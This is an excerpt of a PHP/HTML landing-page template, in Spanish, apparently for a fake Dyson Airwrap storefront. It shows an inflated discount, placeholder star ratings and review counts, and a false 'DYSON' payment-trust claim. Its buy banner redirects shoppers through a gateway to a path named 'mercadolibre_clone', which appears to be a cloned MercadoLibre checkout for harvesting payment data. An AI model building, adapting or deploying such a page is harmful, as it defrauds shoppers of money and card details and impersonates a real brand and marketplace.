...
$landing_slug  = 'dyson-airwrap-complete';
$landing_token = obtenerOCrearTokenLanding($landing_slug, "Dyson Airwrap Multi-Styler Complete Long | Moldeador de Cabello de Alta Gama", 320000);
$precio_num    = 320000;
$precio_fmt    = '320.000';
...
<head>
    ...
    <title><?= htmlspecialchars("Dyson Airwrap Multi-Styler Complete Long | Moldeador de Cabello de Alta Gama") ?></title>
...
<body class="<?= $es_modo_edicion ? 'modo-edicion-activo' : '' ?>" style="<?= $es_modo_edicion ? 'margin-top: 50px;' : '' ?>">
    ...
    <div class="category-switcher">
        <a href="#cat1" class="category-pill active" data-editable="true">BELLEZA CAPILAR</a>
        <a href="#cat2" class="category-pill inactive" data-editable="true">ESTILISMO PRO</a>
    </div>
    ...
    <main class="landing-container">
        <div class="product-grid-layout">
            ...
            <section class="product-info">
                <h1 class="product-title" data-editable="true"><?= htmlspecialchars("Dyson Airwrap Multi-Styler Complete Long | Moldeador de Cabello de Alta Gama") ?></h1>

                <div class="rating-row">
                    <div class="stars-container">★★★★★</div>
                    <span class="reviews-count" data-editable="true">(64)</span>
                </div>

                <div class="price-row">
                    <span class="current-price" data-editable="true">$ 320.000</span>
                    <span class="old-price" data-editable="true">$ 590.000</span>
                    <span class="discount-pill" data-editable="true">-46% OFF</span>
                </div>

                <div class="variant-block">
                    <div class="variant-header">
                        <div class="variant-label">Color / Variante: <span id="colorNameDisplay" data-editable="true"><?= htmlspecialchars("Nickel & Copper") ?></span></div>
                    </div>
                ...
                <div class="size-block">
                    ...
                    <div class="size-pills-row">
                        <button class="size-pill" data-editable="true"><?= htmlspecialchars("Kit 6 en 1") ?></button>
                    </div>
                </div>
                ...
                <div class="accordion-item">
                    ...
                    <div class="accordion-body open">
                        <p data-editable="true">Moldeador multifuncional para cabello que seca, riza, da forma y elimina el encrespamiento utilizando el efecto Coanda sin calor extremo para proteger el brillo natural de tu cabello.</p>
                    </div>
                </div>
                ...
                <div class="secure-trust-box">
                    ...
                    <ul class="secure-trust-list">
                        ...
                        <li><span class="check-icon">✓</span> <span data-editable="true"><?= htmlspecialchars("DYSON") ?> comparte información de pago únicamente con proveedores de pago confiables comprometidos con proteger tus datos.</span></li>
                    </ul>
                </div>
            </section>
    ...
    <div class="ml-promo-banner-wrap" onclick="window.location.href='<?= URL_PASARELA ?>/pago/mercadolibre_clone/index.php?token=<?= $landing_token ?>'">
        <div class="ml-banner-inner">
            ...
            <div class="ml-banner-center">
                <span class="ml-brand-name"><?= htmlspecialchars("DYSON") ?></span>
                <span class="ml-product-name"><?= htmlspecialchars("Dyson Airwrap Multi-Styler Complete Long | Moldeador de Cabello de Alta Gama") ?></span>
    ...
    <section class="customer-reviews-section" id="customerReviewsSection">
        <div class="reviews-header-block">
            ...
            <div class="overall-rating-wrap">
                <span class="overall-rating-num" data-editable="true">4.9</span>
            ...
            <div class="filters-left-group">
                ...
                <div class="review-filter-pill">
                    ...
                    <select class="filter-select-box" id="filterColor" onchange="renderReviews()">
                        <option value="All">All</option>
                        <option value="<?= htmlspecialchars("Nickel & Copper") ?>"><?= htmlspecialchars("Nickel & Copper") ?></option>
                    </select>
                </div>
                <div class="review-filter-pill">
                    <span>Rating</span>
    ...
    <footer class="generic-footer">
        ...
        <div class="footer-bottom-generic">
            <div>© <?= date('Y') ?> <span data-editable="true"><?= htmlspecialchars("DYSON") ?></span>. Todos los derechos reservados.</div>
    ...
    <div class="cart-overlay" id="cartOverlay" onclick="if(event.target===this) toggleCart()">
        <div class="cart-drawer">
            ...
            <div class="cart-footer">
                <div class="cart-summary-row"><span>Subtotal</span><span id="cartSubtotal">$ 320.000</span></div>
                <div class="cart-summary-row"><span>Envío</span><span style="color:#059669; font-weight:700;">GRATIS</span></div>
                <div class="cart-summary-row total"><span>Total</span><span id="cartTotal">$ 320.000</span></div>
    ...
    <script>
        ...
        const PRODUCTO_TITULO = "Dyson Airwrap Multi-Styler Complete Long | Moldeador de Cabello de Alta Gama";
        const LANDING_TOKEN = "1aa836f985f4d09d4a93f9f1251971ec";
        const LANDING_SLUG = "dyson-airwrap-complete";
        ...
        let cartState = { qty: 1, variant: "Nickel & Copper", size: "Kit 6 en 1" };
